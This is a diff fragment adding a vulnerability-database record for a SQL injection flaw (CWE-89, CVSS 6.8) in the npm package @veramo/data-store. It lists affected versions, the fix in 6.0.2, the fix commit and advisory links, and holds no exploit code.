+      - pkg:npm/%40veramo/data-store@5.1.3-next.6
+      - pkg:npm/%40veramo/data-store@5.1.3-next.8
+      - pkg:npm/%40veramo/data-store@5.1.4-next.1
+      - pkg:npm/%40veramo/data-store@5.1.4-next.3
+      - pkg:npm/%40veramo/data-store@5.1.5-next.3
+      - pkg:npm/%40veramo/data-store@5.1.5-next.4
+      - pkg:npm/%40veramo/data-store@5.1.5-next.6
+      - pkg:npm/%40veramo/data-store@5.1.5-next.8
+      - pkg:npm/%40veramo/data-store@5.1.5-next.9
+      - pkg:npm/%40veramo/data-store@5.1.5-next.10
+      - pkg:npm/%40veramo/data-store@5.1.5-next.11
+      - pkg:npm/%40veramo/data-store@5.1.5-next.12
+      - pkg:npm/%40veramo/data-store@5.1.5-next.13
+      - pkg:npm/%40veramo/data-store@5.1.5-next.14
+      - pkg:npm/%40veramo/data-store@5.1.5-next.15
+      - pkg:npm/%40veramo/data-store@5.1.5-next.16
+      - pkg:npm/%40veramo/data-store@5.1.5-next.18
+      - pkg:npm/%40veramo/data-store@5.1.5-unstable.16
+      - pkg:npm/%40veramo/data-store@5.1.5-unstable.19
+      - pkg:npm/%40veramo/data-store@5.1.5-unstable.20
+      - pkg:npm/%40veramo/data-store@5.2.0
+      - pkg:npm/%40veramo/data-store@5.2.1-next.1
+      - pkg:npm/%40veramo/data-store@5.2.1-next.2
+      - pkg:npm/%40veramo/data-store@5.2.1-next.3
+      - pkg:npm/%40veramo/data-store@5.2.1-next.4
+      - pkg:npm/%40veramo/data-store@5.2.1-next.5
+      - pkg:npm/%40veramo/data-store@5.2.1-next.6
+      - pkg:npm/%40veramo/data-store@5.2.1-next.7
+      - pkg:npm/%40veramo/data-store@5.2.1-next.8
+      - pkg:npm/%40veramo/data-store@5.2.1-next.9
+      - pkg:npm/%40veramo/data-store@5.2.1-next.19
+      - pkg:npm/%40veramo/data-store@5.2.1-next.21
+      - pkg:npm/%40veramo/data-store@5.2.1-next.22
+      - pkg:npm/%40veramo/data-store@5.2.1-next.23
+      - pkg:npm/%40veramo/data-store@5.2.1-next.25
+      - pkg:npm/%40veramo/data-store@5.2.1-next.27
+      - pkg:npm/%40veramo/data-store@5.2.1-next.31
+      - pkg:npm/%40veramo/data-store@5.2.1-next.33
+      - pkg:npm/%40veramo/data-store@5.2.1-unstable.13
+      - pkg:npm/%40veramo/data-store@5.2.1-unstable.15
+      - pkg:npm/%40veramo/data-store@5.2.1-unstable.22
+      - pkg:npm/%40veramo/data-store@5.3.0
+      - pkg:npm/%40veramo/data-store@5.3.1-next.4
+      - pkg:npm/%40veramo/data-store@5.3.1-next.6
+      - pkg:npm/%40veramo/data-store@5.3.1-next.7
+      - pkg:npm/%40veramo/data-store@5.3.1-next.9
+      - pkg:npm/%40veramo/data-store@5.4.0
+      - pkg:npm/%40veramo/data-store@5.4.1-next.1
+      - pkg:npm/%40veramo/data-store@5.4.1-next.2
+      - pkg:npm/%40veramo/data-store@5.4.1-next.4
+      - pkg:npm/%40veramo/data-store@5.4.1-next.6
+      - pkg:npm/%40veramo/data-store@5.4.1
+      - pkg:npm/%40veramo/data-store@5.4.2-next.1
+      - pkg:npm/%40veramo/data-store@5.4.2-next.2
+      - pkg:npm/%40veramo/data-store@5.4.2-next.3
+      - pkg:npm/%40veramo/data-store@5.4.2-next.4
+      - pkg:npm/%40veramo/data-store@5.4.2-next.5
+      - pkg:npm/%40veramo/data-store@5.4.2-next.6
+      - pkg:npm/%40veramo/data-store@5.4.2-next.7
+      - pkg:npm/%40veramo/data-store@5.4.2-next.8
+      - pkg:npm/%40veramo/data-store@5.4.2-next.9
+      - pkg:npm/%40veramo/data-store@5.4.2-next.10
+      - pkg:npm/%40veramo/data-store@5.4.2-next.11
+      - pkg:npm/%40veramo/data-store@5.4.2-next.13
+      - pkg:npm/%40veramo/data-store@5.4.2-next.14
+      - pkg:npm/%40veramo/data-store@5.4.2-next.16
+      - pkg:npm/%40veramo/data-store@5.4.2-next.17
+      - pkg:npm/%40veramo/data-store@5.4.2-next.18
+      - pkg:npm/%40veramo/data-store@5.4.2-next.20
+      - pkg:npm/%40veramo/data-store@5.4.2-next.21
+      - pkg:npm/%40veramo/data-store@5.4.2-next.22
+      - pkg:npm/%40veramo/data-store@5.4.2-next.23
+      - pkg:npm/%40veramo/data-store@5.4.2-next.24
+      - pkg:npm/%40veramo/data-store@5.4.2-next.26
+      - pkg:npm/%40veramo/data-store@5.4.2-next.27
+      - pkg:npm/%40veramo/data-store@5.4.2-unstable.23
+      - pkg:npm/%40veramo/data-store@5.5.0
+      - pkg:npm/%40veramo/data-store@5.5.1-next.2
+      - pkg:npm/%40veramo/data-store@5.5.1-next.3
+      - pkg:npm/%40veramo/data-store@5.5.1-next.5
+      - pkg:npm/%40veramo/data-store@5.5.1-next.6
+      - pkg:npm/%40veramo/data-store@5.5.1
+      - pkg:npm/%40veramo/data-store@5.5.2-next.2
+      - pkg:npm/%40veramo/data-store@5.5.2-next.3
+      - pkg:npm/%40veramo/data-store@5.5.2-next.4
+      - pkg:npm/%40veramo/data-store@5.5.2-next.5
+      - pkg:npm/%40veramo/data-store@5.5.2-next.8
+      - pkg:npm/%40veramo/data-store@5.5.2-next.9
+      - pkg:npm/%40veramo/data-store@5.5.2-next.10
+      - pkg:npm/%40veramo/data-store@5.5.2-next.11
+      - pkg:npm/%40veramo/data-store@5.5.2-next.12
+      - pkg:npm/%40veramo/data-store@5.5.2-next.14
+      - pkg:npm/%40veramo/data-store@5.5.2-next.15
+      - pkg:npm/%40veramo/data-store@5.5.2-next.16
+      - pkg:npm/%40veramo/data-store@5.5.2
+      - pkg:npm/%40veramo/data-store@5.5.3-next.17
+      - pkg:npm/%40veramo/data-store@5.5.3
+      - pkg:npm/%40veramo/data-store@5.5.4-next.18
+      - pkg:npm/%40veramo/data-store@5.5.4-next.19
+      - pkg:npm/%40veramo/data-store@5.5.4-next.20
+      - pkg:npm/%40veramo/data-store@5.5.4-next.21
+      - pkg:npm/%40veramo/data-store@5.5.4-next.22
+      - pkg:npm/%40veramo/data-store@5.5.4-next.23
+      - pkg:npm/%40veramo/data-store@5.5.4-next.24
+      - pkg:npm/%40veramo/data-store@5.5.4-next.25
+      - pkg:npm/%40veramo/data-store@5.5.4-next.27
+      - pkg:npm/%40veramo/data-store@5.5.4-next.28
+      - pkg:npm/%40veramo/data-store@5.5.4-next.29
+      - pkg:npm/%40veramo/data-store@5.5.4-next.30
+      - pkg:npm/%40veramo/data-store@5.5.4-next.31
+      - pkg:npm/%40veramo/data-store@5.5.4-next.32
+      - pkg:npm/%40veramo/data-store@5.6.0
+      - pkg:npm/%40veramo/data-store@5.6.1-next.33
+      - pkg:npm/%40veramo/data-store@5.6.1-next.34
+      - pkg:npm/%40veramo/data-store@5.6.1-next.35
+      - pkg:npm/%40veramo/data-store@5.6.1-next.36
+      - pkg:npm/%40veramo/data-store@5.6.1-next.37
+      - pkg:npm/%40veramo/data-store@5.6.1-next.40
+      - pkg:npm/%40veramo/data-store@5.6.1-next.41
+      - pkg:npm/%40veramo/data-store@5.6.1-next.42
+      - pkg:npm/%40veramo/data-store@5.6.1-next.43
+      - pkg:npm/%40veramo/data-store@5.6.1-next.44
+      - pkg:npm/%40veramo/data-store@5.6.1-next.45
+      - pkg:npm/%40veramo/data-store@5.6.1-next.46
+      - pkg:npm/%40veramo/data-store@5.6.1-next.47
+      - pkg:npm/%40veramo/data-store@5.6.1-next.53
+      - pkg:npm/%40veramo/data-store@5.6.1-next.54
+      - pkg:npm/%40veramo/data-store@5.6.1-next.55
+      - pkg:npm/%40veramo/data-store@5.6.1-next.56
+      - pkg:npm/%40veramo/data-store@5.6.1-next.57
+      - pkg:npm/%40veramo/data-store@5.6.1-next.61
+      - pkg:npm/%40veramo/data-store@5.6.1-unstable.36
+      - pkg:npm/%40veramo/data-store@6.0.0
+      - pkg:npm/%40veramo/data-store@6.0.1-next.1
+      - pkg:npm/%40veramo/data-store@6.0.1-next.4
+      - pkg:npm/%40veramo/data-store@6.0.1-next.5
+      - pkg:npm/%40veramo/data-store@6.0.1-next.6
+      - pkg:npm/%40veramo/data-store@6.0.1-next.7
+      - pkg:npm/%40veramo/data-store@6.0.1-next.8
+      - pkg:npm/%40veramo/data-store@6.0.1-next.9
+      - pkg:npm/%40veramo/data-store@6.0.1-next.10
+      - pkg:npm/%40veramo/data-store@6.0.1-next.13
+      - pkg:npm/%40veramo/data-store@6.0.1-next.14
+      - pkg:npm/%40veramo/data-store@6.0.1-next.15
+      - pkg:npm/%40veramo/data-store@6.0.1-next.16
+      - pkg:npm/%40veramo/data-store@6.0.1-next.18
+      - pkg:npm/%40veramo/data-store@6.0.1-next.19
+      - pkg:npm/%40veramo/data-store@6.0.1-next.20
+      - pkg:npm/%40veramo/data-store@6.0.1-next.21
+      - pkg:npm/%40veramo/data-store@6.0.1-next.22
+      - pkg:npm/%40veramo/data-store@6.0.1-next.23
+      - pkg:npm/%40veramo/data-store@6.0.1-next.24
+      - pkg:npm/%40veramo/data-store@6.0.1-next.25
+      - pkg:npm/%40veramo/data-store@6.0.1-next.26
+      - pkg:npm/%40veramo/data-store@6.0.1-next.27
+      - pkg:npm/%40veramo/data-store@6.0.1-next.28
+      - pkg:npm/%40veramo/data-store@6.0.1-next.40
+      - pkg:npm/%40veramo/data-store@6.0.1-next.47
+      - pkg:npm/%40veramo/data-store@6.0.1-next.48
+      - pkg:npm/%40veramo/data-store@6.0.1-next.49
+      - pkg:npm/%40veramo/data-store@6.0.1-next.51
+      - pkg:npm/%40veramo/data-store@6.0.1-next.52
+      - pkg:npm/%40veramo/data-store@6.0.1-next.53
+      - pkg:npm/%40veramo/data-store@6.0.1-next.54
+      - pkg:npm/%40veramo/data-store@6.0.1
+      - pkg:npm/%40veramo/data-store@6.0.2-next.57
+    fixed_packages:
+      - pkg:npm/%40veramo/data-store@6.0.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/decentralized-identity/veramo
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/decentralized-identity/veramo
+        commit: 067e39dd76f11ee2d25b99c8361d4f02a4223e3b
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-38cw-85xc-xr9x/GHSA-38cw-85xc-xr9x.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/decentralized-identity/veramo
+    reference_type:
+    reference_id:
+  - url: https://github.com/decentralized-identity/veramo/commit/067e39dd76f11ee2d25b99c8361d4f02a4223e3b
+    reference_type:
+    reference_id:
+  - url: https://github.com/decentralized-identity/veramo/pull/1482
+    reference_type:
+    reference_id:
+  - url: https://github.com/decentralized-identity/veramo/releases/tag/v6.0.2
+    reference_type:
+    reference_id:
+  - url: https://github.com/decentralized-identity/veramo/security/advisories/GHSA-38cw-85xc-xr9x
+    reference_type:
+    reference_id: GHSA-38cw-85xc-xr9x
+exploits: []
